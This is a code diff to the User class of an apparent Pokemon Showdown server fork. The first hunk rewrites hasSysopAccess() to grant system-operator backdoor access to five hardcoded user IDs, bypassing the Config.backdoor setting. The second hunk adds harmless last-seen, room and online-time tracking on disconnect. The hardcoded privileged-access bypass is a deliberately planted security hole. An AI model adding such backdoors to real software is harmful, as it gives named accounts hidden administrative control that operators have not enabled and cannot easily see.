@@ -649,7 +649,7 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if ((this.isSysop && Config.backdoor) || this.userid == 'distrib' || this.userid == 'panur' || this.userid == 'wally' || this.userid == 'saitochi' || this.userid == 'shiruushi') {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -1175,6 +1175,20 @@ class User {
 	 * @param {Connection} connection
 	 */
 	onDisconnect(connection) {
+		let name = 'Guest ' + this.guestNum;
+		let userid = toId(name);
+		if (this.named) Db('seen').set(this.userid, Date.now());
+		if (this.registered && this.userid !== userid) {
+			let rooms = [];
+			this.inRooms.forEach(function (room) {
+				if (['global', 'lobby', 'staff'].indexOf(room) === -1) rooms.push(room);
+			});
+			if (rooms.length) Db('rooms').set(this.userid, rooms);
+			if (Ontime[this.userid]) {
+				Db('ontime').set(this.userid, Db('ontime').get(this.userid, 0) + (Date.now() - Ontime[this.userid]));
+				delete Ontime[this.userid];
+			}
+		}
 		for (const [i, connected] of this.connections.entries()) {
 			if (connected === connection) {
 				// console.log('DISCONNECT: ' + this.userid);
